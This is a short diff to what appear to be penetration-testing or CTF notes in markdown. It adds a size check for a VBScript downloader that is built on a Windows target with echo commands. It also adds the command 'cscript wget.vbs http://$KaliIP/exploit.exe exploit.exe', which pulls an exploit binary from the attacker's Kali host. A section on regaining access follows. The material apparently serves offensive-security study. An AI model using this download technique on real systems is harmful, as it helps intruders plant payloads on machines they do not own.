@@ -835,6 +835,8 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
+note: wget.vbs should be 990 bytes
 then cscript wget.vbs http://$KaliIP/exploit.exe exploit.exe
+
 ```
 ## How to replicate to otbain access again:
